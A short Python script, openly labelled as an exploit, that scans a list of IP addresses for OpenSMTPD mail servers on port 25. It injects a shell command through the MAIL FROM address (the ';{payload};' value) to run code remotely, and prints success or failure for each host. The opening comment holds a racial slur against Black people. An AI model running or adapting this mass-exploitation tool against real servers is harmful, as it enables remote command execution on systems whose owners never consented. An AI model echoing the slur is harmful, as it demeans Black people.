# FUCK BLACKS
# exploit written by horrorhood aka scammer robert
from socket import *
import sys

PAYLOAD = "ls" # your payload
IPLIST = open(sys.argv[1], "r").readlines()
PORT = 25 # port 

def exploit(ip:str, port:int):
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(2)

    try:
        s.connect((ip, port))
        res = s.recv(1024)

        if 'OpenSMTPD' not in str(res):
            return False


        s.send(b'HELO x\r\n')
        res = s.recv(1024)
        if '250' not in str(res):
            return False

        s.send(bytes('MAIL FROM:<;{};>\r\n'.format(PAYLOAD), 'utf-8'))
        res = s.recv(1024)
        if '250' not in str(res):
            return False
    
        s.send(b'RCPT TO:<root>\r\n')
        s.recv(1024)
        s.send(b'DATA\r\n')
        s.recv(1024)
        s.send(b'\r\nxxx\r\n.\r\n')
        s.recv(1024)
        s.send(b'QUIT\r\n')
        s.recv(1024)
        return True
    except:
        return False

def main():
    for ips in IPLIST:
        ip = ips.strip("\r\n")
        if exploit(ip, PORT):
            print(f"[OPENSMTPD] Sent payload ~> {ip}:{PORT}")
        else:
            print(f"[OPENSMTPD] Error sending payload ~> {ip}:{PORT}")


    

if __name__ == "__main__":
    main()